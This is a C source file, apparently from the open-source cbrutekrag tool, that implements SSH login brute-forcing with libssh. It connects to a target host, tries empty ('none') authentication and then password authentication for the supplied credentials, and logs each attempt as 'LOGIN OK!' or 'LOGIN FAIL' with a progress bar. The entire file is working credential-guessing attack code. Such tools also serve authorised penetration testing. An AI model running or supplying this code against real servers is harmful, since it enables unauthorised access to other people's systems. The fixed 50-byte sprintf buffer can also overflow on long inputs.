/*
Copyright (c) 2014-2018 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <stdio.h>
#include <libssh/libssh.h>

#include "cbrutekrag.h"
#include "progressbar.h"
#include "log.h"

int g_timeout;

int bruteforce_ssh_login(const char *hostname, unsigned int port, const char *username, const char *password)
{
    ssh_session my_ssh_session;
    int verbosity = 0;

    if (g_verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
        verbosity = SSH_LOG_PROTOCOL;
    } else {
        verbosity = SSH_LOG_NOLOG;
    }

    my_ssh_session = ssh_new();

    if (my_ssh_session == NULL) {
        log_error("Cant create SSH session.");
        return -1;
    }

    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
#if LIBSSH_VERSION_MAYOR > 0 || (LIBSSH_VERSION_MAYOR == 0 && LIBSSH_VERSION_MINOR >= 6)
    ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
#endif
    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &g_timeout);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);

    int r;
    r = ssh_connect(my_ssh_session);
    if (r != SSH_OK) {
        ssh_free(my_ssh_session);
        if (g_verbose & CBRUTEKRAG_VERBOSE_MODE) {
            log_error(
                "Error connecting to %s:%d %s.",
                hostname,
                port,
                ssh_get_error(my_ssh_session)
            );
        }
        return -1;
    }

    r = ssh_userauth_none(my_ssh_session, username);
    if (r == SSH_AUTH_SUCCESS || r == SSH_AUTH_ERROR) {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return r;
    }

    int method = 0;

    method = ssh_userauth_list(my_ssh_session, NULL);

    if (method & SSH_AUTH_METHOD_NONE) {
        r = ssh_userauth_none(my_ssh_session, NULL);
        if (r == SSH_AUTH_SUCCESS) {
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    if (method & SSH_AUTH_METHOD_PASSWORD) {
        r = ssh_userauth_password(my_ssh_session, NULL, password);
        if (r == SSH_AUTH_SUCCESS) {
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return -1;
}

int bruteforce_ssh_try_login(const char *hostname, const int port, const char *username, const char *password, int count, int total, FILE *output)
{
    if (! g_verbose) {
        char bar_suffix[50];
        sprintf(bar_suffix, "[%d] %s:%d %s %s", count, hostname, port, username, password);
        progressbar_render(count, total, bar_suffix, -1);
    }
    int ret = bruteforce_ssh_login(hostname, port, username, password);
    if (ret == 0) {
        log_debug("LOGIN OK!\t%s:%d\t%s\t%s", hostname, port, username, password);
        if (output != NULL) {
            log_output(output, "LOGIN OK!\t%s:%d\t%s\t%s", hostname, port, username, password);
        }
        return 0;
    } else {
        log_debug("LOGIN FAIL\t%s:%d\t%s\t%s", hostname, port, username, password);
    }
    return -1;
}
